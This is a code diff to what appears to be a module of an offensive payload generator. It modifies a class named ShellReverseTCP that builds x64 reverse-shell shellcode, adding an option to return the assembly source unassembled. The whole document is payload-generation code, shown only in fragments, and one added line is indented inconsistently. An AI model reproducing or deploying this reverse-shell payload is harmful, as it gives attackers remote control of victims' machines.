@@ -28,7 +28,7 @@ from hatvenom import HatVenom
 
 
 class ShellReverseTCP(HatVenom):
-    def generate(self, options={}):
+    def generate(self, assemble=True, options={}):
         if 'BPORT' not in options:
             return b''
 
@@ -36,17 +36,17 @@ class ShellReverseTCP(HatVenom):
 
         shellcode = f"""
         start:
-	    xor rdi, rdi
-	    mov dil, 0x2
-	    xor rsi, rsi
-	    mov sil, 0x1
-	    xor rdx, rdx
+            xor rdi, rdi
+            mov dil, 0x2
+            xor rsi, rsi
+            mov sil, 0x1
+            xor rdx, rdx
 
-	    xor rax, rax
-	    mov al, 2
-	    ror rax, 0x28
-	    mov al, 0x61
-	    mov r12, rax
+            xor rax, rax
+            mov al, 2
+            ror rax, 0x28
+            mov al, 0x61
+            mov r12, rax
             syscall
 
             mov	r9, rax
@@ -95,4 +95,6 @@ class ShellReverseTCP(HatVenom):
             syscall
         """
 
-        return self.assemble('x64', shellcode)
+	if assemble:
+            return self.assemble('x64', shellcode)
+        return shellcode
